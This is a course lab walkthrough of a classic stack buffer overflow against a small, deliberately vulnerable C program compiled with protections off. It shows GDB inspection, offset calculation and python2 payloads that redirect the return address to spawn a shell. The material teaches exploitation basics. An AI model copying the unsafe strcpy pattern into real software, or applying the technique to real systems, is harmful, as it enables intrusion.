We're going to walk through the example from class, carrying out a simple stack
buffer overflow attack.

To get started, create a file called example2.c with the example code:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void bar() {
  system("/bin/sh");
}

void foo() {
  printf("hello all!!\n");
  exit(0);
}

void func(int a, int b, char *str) {
  int c = 0xdeadbeef;
  char buf[4];
  strcpy(buf,str);
}

int main(int argc, char**argv) {
  func(0xaaaaaaaa,0xbbbbbbbb,argv[1]);
  return 0;
}
```

Then compile the program with GCC:

```
gcc -m32 -O0 -ggdb -static -U_FORTIFY_SOURCE -fno-stack-protector -zexecstack -no-pie -o example2 example2.c
```

You'll note that we compiled this program with a bunch of flags. These
flags disable many protection mechanism that would make such an attack
harder to carry out. We'll see in class what most of these are.

## Code and environment inspection

Our first goal is to manually modify the stack frames to change the
return address in `fun` to jump (when it returns) to the beginning of
`foo`, instead of returning back to `main`.

To get started, let's start GDB:

```
$ gdb example2
```

Within GDB let's set a breakpoint on `func` and run the program with argument
`"AAAA"`:

```
> b func
> set args "AAAA"
> r
```

To figure out where to jump to, let's first look at the what's on the stack
frame:

Recall that the first argument is off by 8:

```
> x $ebp+8
0xffffced0:     0xaaaaaaaa
```

The second argument is at offset 12:

```
> x $ebp+12
0xffffced4:     0xbbbbbbbb
```

The old `$ebp` is at offset 0:

```
> x $ebp
0xffffcec8:     0xffffcee8
```

If our function returns normally, the `$ebp` will be set to `0xffffcee8`. If
you want to see this, set a breakpoint right after the `strcpy` (`b 17`),
continue (`c` in GDB) and then step through (`s`). You can also stop at the
exact `leave` instruction by setting a break point at the address:

```
> b *0x8049c1e
```

You can find such addresses with `disas`:

```
> disas func
Dump of assembler code for function func:
   0x08049bee <+0>:     push   %ebp
   0x08049bef <+1>:     mov    %esp,%ebp
   0x08049bf1 <+3>:     push   %ebx
   0x08049bf2 <+4>:     sub    $0x14,%esp
   0x08049bf5 <+7>:     call   0x8049c68 <__x86.get_pc_thunk.ax>
   0x08049bfa <+12>:    add    $0x96406,%eax
   0x08049bff <+17>:    movl   $0xdeadbeef,-0xc(%ebp)
   0x08049c06 <+24>:    sub    $0x8,%esp
   0x08049c09 <+27>:    pushl  0x10(%ebp)
   0x08049c0c <+30>:    lea    -0x10(%ebp),%edx
   0x08049c0f <+33>:    push   %edx
   0x08049c10 <+34>:    mov    %eax,%ebx
   0x08049c12 <+36>:    call   0x8049028
   0x08049c17 <+41>:    add    $0x10,%esp
   0x08049c1a <+44>:    nop
   0x08049c1b <+45>:    mov    -0x4(%ebp),%ebx
   0x08049c1e <+48>:    leave
   0x08049c1f <+49>:    ret
End of assembler dump.
```

> NOTE: This address will likely be different on your machine.

Where is the return address? It's 4 off the `$ebp`:

```
> x $ebp+4
0xffffcecc:     0x08049c58
```

Now what is this `0x08049c58` value? It's the address in `main` right after the
call to `func` ( which is at address `0x8039bee`):

```
> disas main
Dump of assembler code for function main:
   0x08049c20 <+0>:     lea    0x4(%esp),%ecx
	 ...
   0x08049c53 <+51>:    call   0x8049bee <func>
   0x08049c58 <+56>:    add    $0x10,%esp
	...
End of assembler dump.
```

Great. Now to to direct the control flow to `foo` instead of back to `main` we
just need to overwrite the return address. We can do this by setting `$ebp+4`:

We can do this by getting `foo`'s address:

```
>  p &foo
$2 = (void (*)()) 0x8049bc0 <foo>
> set {int}($ebp+4)=0x8049bc0
```

Or more simply:

```
> set {int}($ebp+4)=&foo
```

Now if you continue (`c`) the `ret` will jump to `0x8049bc0` and print:

```
hello all!!
```

As an attacker, we need to overflow the buffer to write the return address
though. We can't attach GDB to a process we don't control.

## Overflowing the buffer

So, let's overflow the buffer. To see the effects of the overflow make sure you
set the breakpoint after `strcpy` and let's change the args to go just past
`buf` 4-byte boundary:

```
> b 17
> set args
> set args "AAAABC"
> r
```

If you print the local variable `c` before and after the `strcpy` you'll see
that we've overflow from `buf` into `c`:

```
> p c
$14 = 0xdeadbeef
> c
> p c
$15 = 0xde004342
```

You'll notice that `c` changed from `0xdeadbeef` to `0xde004242`, i.e.,
`0xde"\0CB"`. If we then change the args to `"AAAABCD"` you'll see that `c =
0x00444342`.

But we need to overflow the return address. How do we figure out how much we
need to overflow? Compute the distance between the return address and buffer
start. In `func`:

```
> p $ebp+4-&buf[0]
$16 = 0x14
```

This means that we need to supply an arugment that is 20 bytes long (0x14) to
get up to the return address. Let's do that:

```
> set args "AAAABBBBCCCCDDDDEEEEFFFF"
> r
```

Now if you inspect the contents of the return addresss (after `strcpy`) you'll
see it filled with all `F`s:

```
> x $ebp+4
0xffffcebc:     0x46464646
```

If you let this program continue it will crash with:

> Cannot access memory at address 0x46464646

Why? We'll we're trying to read the instruction at address `0x46464646` to
execute it. That's not a valid address. Let's instead point the program to
`foo` (`0x8049bc0`):


```
> set args $(python2 -c "print 'AAAABBBBCCCCDDDDEEEE\xc0\x9b\x04\x08'")
> r
```

Now if you run the program it will print `hello all`.

We can do all of this from the shell:

```
$ ./example2 `python2 -c "print 'AAAABBBBCCCCDDDDEEEE\xc0\x9b\x04\x08'"`
hello all!!
```

In practice you'll want to get a shell. In our example we can get a shell by
setting the return address to `bar`:

```
> p &bar
$35 = (void (*)()) 0x8049b95 <bar>
> set args $(python2 -c "print 'AAAABBBBCCCCDDDDEEEE\x95\x9b\x04\x08'")
> r
sh-5.0$
```

Realistically you won't have a nice function like `bar` in the process and
you'll need to essentially mock a call to `system` yourself. You can do this by
overflowing the buffer with your (shell) code and have the return address point
to your code instead of existing functions. You'll get to do this in one of you
assignments!


## GEF

You may find [GEF](https://gef.readthedocs.io/en/master/) helpful throught the
quarter.  I like ATT synax for x86: `set disassembly-flavor att` and like the
stack growing downwards to match slides (`gef config context.grow_stack_down
True`).

